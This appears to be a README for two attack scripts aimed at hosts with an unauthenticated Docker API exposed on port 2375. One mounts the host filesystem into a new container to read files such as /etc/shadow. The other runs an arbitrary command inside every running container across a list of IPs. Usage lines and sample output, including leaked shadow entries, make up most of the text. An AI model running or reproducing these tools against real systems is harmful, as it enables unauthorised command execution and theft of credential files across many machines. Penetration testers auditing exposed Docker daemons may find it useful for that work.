# Docker Host File Read (docker_host_fs.py):
This script creates a container with the hosts FS mounted, to read files provided in a list of IPs which have the Docker API exposed.

optional arguments:

```
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port (default: 2375)
  -c CMD, --cmd CMD     Text File with list of files to be read.Example : 
                        	/etc/shadow
                        	/etc/issue.net
```

required named arguments:

```
  -i IP_FILE, --ip_file IP_FILE
                        File with new line seperated IPs
```

Example Usage :
```
$ python3 docker_host_fs.py -i ips 
Host : 10.0.0.1:2375
Output of /host/etc/issue.net /host/etc/shadow:
Ubuntu 18.04.4 LTS
root:!:18216:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::

###################################################
Host : 10.0.0.2:2375
Output of /host/etc/issue.net /host/etc/shadow:
Ubuntu 18.04.4 LTS
root:!:18216:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
...

###################################################
```

# Docker Container Command Execution (docker_cont_exec.py):
This script runs a command on every container running in the list of IPs provided which have the Docker API exposed.

optional arguments:

```
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port (default: 2375)
  -c CMD, --cmd CMD     Command to be executed (default: whoami)
```

required named arguments:
```
  -i IP_FILE, --ip_file IP_FILE
                        File with new line seperated IPs
```

Example Usage :
```
$ python3 docker_cont_exec.py -i ips -c "uname -a"
Host : 127.0.0.1:2375
Container Name : gallant_wilbur
Container Image : simpleserver:latest
Output of uname -a:
Linux 3013bbd4be2a 5.3.0-59-generic #53~18.04.1-Ubuntu SMP Thu Jun 4 14:58:26 UTC 2019 x86_64 GNU/Linux

Container Name : clever_davinci
Container Image : simpleserver:latest
Output of uname -a:
Linux 6557de217970 5.3.0-59-generic #53~18.04.1-Ubuntu SMP Thu Jun 4 14:58:26 UTC 2019 x86_64 GNU/Linux

###################################################
Host : 127.0.0.2:2375
Container Name : brilliant_veg
Container Image : simpleserver:latest
Output of uname -a:
Linux 3013bbd4be2a 5.3.0-59-generic #53~18.04.1-Ubuntu SMP Thu Jun 4 14:58:26 UTC 2019 x86_64 GNU/Linux

Container Name : epic_veg
Container Image : simpleserver:latest
Output of uname -a:
Linux 6557de217970 5.3.0-59-generic #53~18.04.1-Ubuntu SMP Thu Jun 4 14:58:26 UTC 2019 x86_64 GNU/Linux

###################################################
```
